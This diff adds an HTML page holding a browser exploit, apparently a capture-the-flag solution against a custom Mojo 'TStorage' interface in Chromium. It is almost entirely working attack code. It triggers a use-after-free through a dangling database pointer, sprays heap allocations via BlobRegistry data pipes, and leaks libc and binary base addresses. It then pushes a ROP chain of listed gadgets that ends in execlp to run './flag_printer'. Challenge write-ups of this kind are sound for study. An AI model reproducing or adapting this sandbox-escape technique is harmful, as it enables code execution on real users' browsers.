@@ -1,0 +1,162 @@
+<html>
+<body></body> 
+<head>
+    <script src="../mojo_bindings.js"></script>
+    <script src="../third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+    <script src="../third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
+    <script>
+        function getAllocationConstructor() {
+            let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+            Mojo.bindInterface(blink.mojom.BlobRegistry.name,
+            mojo.makeRequest(blob_registry_ptr).handle, "process", true);
+            
+            function Allocation(size=280) {
+                function ProgressClient(allocate) {
+                    function ProgressClientImpl() {
+                    }
+                    ProgressClientImpl.prototype = {
+                        onProgress: async (arg0) => {
+                            if (this.allocate.writePromise) {
+                                this.allocate.writePromise.resolve(arg0);
+                            }
+                        }
+                    };
+                    this.allocate = allocate;
+                    
+                    this.ptr = new mojo.AssociatedInterfacePtrInfo();
+                    var progress_client_req = mojo.makeRequest(this.ptr);
+                    this.binding = new mojo.AssociatedBinding(
+                    blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
+                    );
+                    
+                    return this;
+                }
+                
+                this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
+                this.progressClient = new ProgressClient(this);
+                blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
+                    this.serialized_blob = res.blob;
+                })
+                
+                this.malloc = async function(data) {
+                    promise = new Promise((resolve, reject) => {
+                        this.writePromise = {resolve: resolve, reject: reject};
+                    });
+                    this.pipe.producer.writeData(data);
+                    this.pipe.producer.close();
+                    written = await promise;
+                    console.assert(written == data.byteLength);
+                }
+                
+                this.free = async function() {
+                    this.serialized_blob.blob.ptr.reset();
+                    await sleep(1000);
+                }
+                
+                this.read = function(offset, length) {
+                    this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
+                    this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
+                    return new Promise((resolve) => {
+                        this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
+                            result = new ArrayBuffer(length);
+                            this.readpipe.consumer.readData(result);
+                            this.watcher.cancel();
+                            resolve(result);
+                        });
+                    });
+                }
+                
+                this.readQword = async function(offset) {
+                    let res = await this.read(offset, 8);
+                    return (new DataView(res)).getBigUint64(0, true);
+                }
+                
+                return this;
+            }
+            
+            async function allocate(data) {
+                let allocation = new Allocation(data.byteLength);
+                await allocation.malloc(data);
+                return allocation;
+            }
+            return allocate;
+        }
+                
+        var libc_addr = 0;
+        var atoi_addr = 0;
+        var base_addr = 0;
+        var tstorage_create_addr = 0;
+        var tstorage_ptr = new blink.mojom.TStoragePtr;
+        var tinstance_ptr = 0;
+        Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tstorage_ptr).handle, "context", true);      
+
+        
+        tstorage_ptr.getLibcAddress().then(function(params){
+            atoi_addr = params.addr;
+            libc_addr = atoi_addr - 0x40680;
+        })
+        tstorage_ptr.getTextAddress().then(function(params){
+            tstorage_create_addr = params.addr;
+            base_addr = tstorage_create_addr - 0x39B5E60;
+        })
+
+        async function kk(){
+            var allocate = getAllocationConstructor();
+            function spray(data, num=kSprayAllocationCount) {
+                print("\t[-] Spraying...");
+                return Promise.all(Array(num).fill().map(() => allocate(data)));
+            }
+
+            const kInnerDbImplSize = 0x678;
+            const kSprayAllocationCount = 0x40;
+            var hmm_ptr = [];
+            var victim_ptr = [];
+            for(i=0; i<20; i++){           
+                var tstorage_ptr = new blink.mojom.TStoragePtr;
+                Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tstorage_ptr).handle, "context", true);
+                await tstorage_ptr.init(); // inner_db_ = new InnerDbImpl();
+                hmm_ptr[i] = tstorage_ptr;
+                let kkk = await tstorage_ptr.createInstance(); // new TStorageImpl(inner_db_.get())... ??????? -> dangling pointer
+                victim_ptr[i] = kkk.instance;                
+            }               
+            for(i=0; i<20; i++){
+                await hmm_ptr[i].ptr.reset();
+            } 
+
+            let aa = await victim_ptr[1].get(4); // leak heap
+            let data = new ArrayBuffer(0x678);
+            let view = new DataView(data)            
+            view.setBigUint64(0, BigInt(base_addr) + 0xa97D7d0n, true); // puts
+            view.setBigUint64(0x8,  0x705f67616c662f2en, true); // ./flag_printer
+            view.setBigUint64(0x10, 0x00007265746e6972n, true);
+            // view.setBigUint64(0x18, 0x0000000000003320n, true);
+            // view.setBigUint64(0x8,  0x00006c612d20736cn, true);
+            
+            // Using a queue to insert our rop payload
+            view.setBigUint64(0x648, BigInt(base_addr) + 0xa97D7d0n, true); // BSS section
+            view.setBigUint64(0x650, BigInt(base_addr) + 0xa97D7d0n, true); // 
+            view.setBigUint64(0x658, 0n, true); // end
+            view.setBigUint64(0x660, 0n, true); // begin
+            
+            // 0x000000000977e0d5 : push rsi ; pop rsp ; pop rbp ; ret
+            // 0x0000000004968e6e : add rdi, 8 ; mov rax, qword ptr [rdi] ; pop rbp ; ret
+            // 0x0000000006b927dc : push rax ; pop rdi ; retf
+            // 0x00000000001306b4 : pop rdx ; pop r10 ; ret
+            // 0x00000000083249c7 : push rax ; pop rsp ; std ; ret
+            // 0x00000000046e7439 : xor esi, esi ; ret
+            let heap = await spray(data, 40);
+            victim_ptr[4].push(libc_addr + 0x1306b4); // pop rdx; pop r10; ret
+            victim_ptr[4].push(0xdeadbeef);
+            victim_ptr[4].push(base_addr + 0x00000000083249c7);
+            victim_ptr[4].push(base_addr + 0x4968e6e); //add rdi, 8 ; mov rax, qword ptr [rdi] ; pop rbp ; ret
+            victim_ptr[4].push(base_addr + 0x4968e6e); 
+            victim_ptr[4].push(base_addr + 0x46e7439); 
+            victim_ptr[4].push(libc_addr + 0xe5300); // execlp
+            victim_ptr[4].getTotalSize(); // Trigger UAF
+
+        }
+        kk();
+    </script>
+</head>
+
+</html>
